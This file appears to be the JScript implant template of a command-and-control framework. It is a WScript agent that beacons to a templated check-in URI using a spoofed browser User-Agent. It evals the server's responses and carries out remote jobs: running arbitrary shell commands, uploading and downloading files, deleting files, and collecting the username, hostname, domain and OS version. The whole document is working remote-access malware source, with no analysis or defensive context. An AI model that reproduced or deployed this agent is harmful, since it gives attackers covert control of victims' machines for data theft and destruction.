var errors = 0;
var wscriptshell = new ActiveXObject("WScript.Shell");
var response = '[["{{ check_in_job_id }}"]]';
var sleep = {{ sleep }};

function post(data){
  try {
    var winhttp = new ActiveXObject("WinHttp.WinHttpRequest.5.1");;
    winhttp.Open('Post', '{{ check_in_uri }}');
    winhttp.setRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0");
    winhttp.setRequestHeader("X-Frame-Options", "SAMEORIGIN");
    winhttp.setRequestHeader("Content-Type", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
    winhttp.Send(data);
    winhttp.WaitForResponse();
    return winhttp;
  } catch (e) {
    errors = errors + 1;
    if(errors > 50){
      WScript.Quit(1);
    }
  }
}

{% include "/jscript/functions/base64.js" %}
{% include "/jscript/functions/delfile.js" %}
{% include "/jscript/functions/dir.js" %}
{% include  "/jscript/functions/download.js" %}
{% include "/jscript/functions/upload.js" %}
{% include "/jscript/functions/cmd.js" %}

while (true) {
  try {
      eval("json_object=" + post(response).responseText + ";");
  } catch (e) {
      var response = '[["{{ check_in_job_id }}"]]';
      WScript.Sleep(sleep);
      continue;
  }
  try {
      response = '[';
      jobs = json_object.job_packet
      for (var job in jobs) {
          var id = jobs[job].id
          var name = jobs[job].name
          var args = jobs[job].arguments.toString().split(',');
          try{
              var results = '';
              if ('upload' === name) {
                  results = upload(b64d(args[0], "bin"), b64d(args[1]));
              }
              if ('download' === name) {
                  results = download(b64d(args[0]));
              }
              if ('dir' === name) {
                  results = dir(b64d(args[0]));
              }
              if ('whoami' === name) {
                  results = b64e(wscriptshell.ExpandEnvironmentStrings("%USERDOMAIN%") + '\\' + wscriptshell.ExpandEnvironmentStrings("%USERNAME%"));
              }
              if ('tmp' === name) {
                  results = b64e(wscriptshell.ExpandEnvironmentStrings("%TMP%"));
              }
              if ('hostname' === name) {
                  results = b64e(wscriptshell.ExpandEnvironmentStrings("%COMPUTERNAME%"));
              }
              if ('domain' === name) {
                  results = b64e(wscriptshell.ExpandEnvironmentStrings("%USERDOMAIN%"));
              }
              if ('os' === name) {
                  results = b64e(wscriptshell.RegRead("HKLM\\\SOFTWARE\\\Microsoft\\\Windows NT\\\CurrentVersion\\\ProductName") + ' ' + wscriptshell.RegRead("HKLM\\\SOFTWARE\\\Microsoft\\\Windows NT\\\CurrentVersion\\\CurrentBuildNumber"));
              }
              if ('cmd' === name) {
                  results = cmd(b64d(args[0]));
              }
              if ('delfile' === name) {
                  results = delfile(b64d(args[0]));
              }
              if ('sleep' === name) {
                  sleep = b64d(args[0]);
                  results = b64e('Sleep change to ' + sleep + ' milliseconds');
              }
              response = response + '["' + id + '","' +  results + '"],';
          } catch (e) {
             response = response + '["' + id + '","' + b64e("Job failed: " + e.message) + '"],';
          }
      }
  } catch (e) {
      // caught for reliability
  }
  response = response + '["{{ check_in_job_id }}"]]';
  WScript.Sleep(sleep);
}